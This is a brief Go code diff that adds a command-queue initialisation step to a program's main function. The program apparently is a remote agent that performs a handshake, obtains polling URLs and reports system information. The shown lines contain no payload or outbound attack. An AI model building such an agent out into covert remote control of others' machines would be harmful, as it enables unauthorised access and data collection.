@@ -102,6 +102,9 @@ func main() {
 	setClientID(handshakeManager.getCurrentClientID())
 	getURL, postURL := handshakeManager.getCurrentURLs()
 
+	// Initialize command queue after all init() functions have registered feature handlers
+	initCommandQueue()
+
 	sysInfoReport, err := collectSystemInfo(getClientID())
 	if err != nil {
 	}
